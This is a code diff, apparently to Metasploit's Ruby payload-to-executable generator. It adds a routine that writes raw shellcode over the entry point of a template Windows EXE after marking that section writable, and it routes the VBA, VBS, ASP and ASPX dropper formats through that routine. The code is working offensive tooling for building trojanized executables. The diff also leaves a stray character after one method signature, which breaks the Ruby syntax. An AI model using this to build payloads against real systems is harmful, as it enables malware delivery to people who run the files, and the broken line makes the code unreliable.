@@ -1,6 +1,6 @@
 # -*- coding: binary -*-
 ##
-# $Id: exe.rb 14286 2011-11-20 01:41:04Z rapid7 $
+# $Id$
 ##
 
 ###
@@ -74,7 +74,7 @@ require 'digest/sha1'
 		if (arch.index(ARCH_X86))
 
 			if (plat.index(Msf::Module::Platform::Windows))
-				return to_win32pe(framework, code, opts)
+				return to_win32pe_only(framework, code, opts)
 			end
 
 			if (plat.index(Msf::Module::Platform::Linux))
@@ -354,8 +354,43 @@ require 'digest/sha1'
 		exe
 	end
 
+	def self.to_win32pe_only(framework, code, opts={})
 
-	def self.to_win32pe_old(framework, code, opts={})
+		# Allow the user to specify their own EXE template
+		set_template_default(opts, "template_x86_windows_old.exe")
+
+		pe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)
+
+		exe = ''
+			File.open(opts[:template], 'rb') { |fd|
+				exe = fd.read(fd.stat.size)
+			}
+
+		sections_header = []
+		pe._file_header.v['NumberOfSections'].times { |i| sections_header << [(i*0x28)+pe.rva_to_file_offset(pe._dos_header.v['e_lfanew']+pe._file_header.v['SizeOfOptionalHeader']+0x18+0x24),exe[(i*0x28)+pe.rva_to_file_offset(pe._dos_header.v['e_lfanew']+pe._file_header.v['SizeOfOptionalHeader']+0x18),0x28]] }
+		
+
+		#look for section with entry point
+		sections_header.each do |sec|
+			virtualAddress = sec[1][0xc,0x4].unpack('L')[0]
+			sizeOfRawData = sec[1][0x10,0x4].unpack('L')[0]
+			characteristics = sec[1][0x24,0x4].unpack('L')[0]
+			if pe.hdr.opt.AddressOfEntryPoint >= virtualAddress && pe.hdr.opt.AddressOfEntryPoint < virtualAddress+sizeOfRawData
+			 	#put this section writable
+			 	characteristics|=0x80000000
+			 	newcharacteristics = [characteristics].pack('L')
+			 	exe[sec[0],newcharacteristics.length]=newcharacteristics
+			 end
+		end
+
+		#put the shellcode at the entry point, overwriting template
+		exe[pe.rva_to_file_offset(pe.hdr.opt.AddressOfEntryPoint),code.length]=code
+
+		return exe
+	end
+
+
+	def self.to_win32pe_old(framework, code, opts={})x
 
 		# Allow the user to specify their own EXE template
 		set_template_default(opts, "template_x86_windows_old.exe")
@@ -901,7 +936,7 @@ End Sub
 	end
 
 	def self.to_win32pe_vba(framework, code, opts={})
-		to_exe_vba(to_win32pe(framework, code, opts))
+		to_exe_vba(to_win32pe_only(framework, code, opts))
 	end
 
 	def self.to_exe_vbs(exes = '', opts={})
@@ -1169,15 +1204,15 @@ End Sub
 	end
 
 	def self.to_win32pe_vbs(framework, code, opts={})
-		to_exe_vbs(to_win32pe(framework, code, opts), opts)
+		to_exe_vbs(to_win32pe_only(framework, code, opts), opts)
 	end
 
 	def self.to_win32pe_asp(framework, code, opts={})
-		to_exe_asp(to_win32pe(framework, code, opts), opts)
+		to_exe_asp(to_win32pe_only(framework, code, opts), opts)
 	end
 
 	def self.to_win32pe_aspx(framework, code, opts={})
-		to_exe_aspx(to_win32pe(framework, code, opts), opts)
+		to_exe_aspx(to_win32pe_only(framework, code, opts), opts)
 	end
 
 	# Creates a jar file that drops the provided +exe+ into a random file name
@@ -1870,6 +1905,11 @@ End Sub
 				output = Msf::Util::EXE.to_win32pe_old(framework, code, exeopts)
 			end
 
+		when 'exe-only'
+			if(not arch or (arch.index(ARCH_X86)))
+				output = Msf::Util::EXE.to_win32pe_only(framework, code, exeopts)
+			end
+
 		when 'elf'
 			if (not plat or (plat.index(Msf::Module::Platform::Linux)))
 				if (not arch or (arch.index(ARCH_X86)))
@@ -1900,7 +1940,7 @@ End Sub
 			output = Msf::Util::EXE.to_vba(framework, code, exeopts)
 
 		when 'vba-exe'
-			exe = Msf::Util::EXE.to_win32pe(framework, code, exeopts)
+			exe = Msf::Util::EXE.to_win32pe_only(framework, code, exeopts)
 			output = Msf::Util::EXE.to_exe_vba(exe)
 
 		when 'vbs'
@@ -1934,7 +1974,7 @@ End Sub
 	end
 
 	def self.to_executable_fmt_formats
-		['dll','exe','exe-small','elf','macho','vba','vba-exe','vbs','loop-vbs','asp','aspx','war','psh','psh-net']
+		['dll','exe','exe-small','exe-only','elf','macho','vba','vba-exe','vbs','loop-vbs','asp','aspx','war','psh','psh-net']
 	end
 
 	#
